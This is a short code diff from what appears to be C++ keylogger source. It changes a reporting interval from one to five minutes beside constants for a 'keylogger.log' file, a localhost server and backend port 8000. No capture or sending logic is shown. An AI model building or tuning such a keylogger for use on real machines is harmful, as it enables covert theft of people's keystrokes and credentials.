@@ -9,6 +9,6 @@
 
 const char* const serverName = "localhost";
 const char* const resource = "/";
-const int intervalMinutes = 1;  // Every 5 minutes
+const int intervalMinutes = 5;  //Minutes
 const std::string log_file_name = "keylogger.log";
 const int BACKEND_PORT = 8000; 
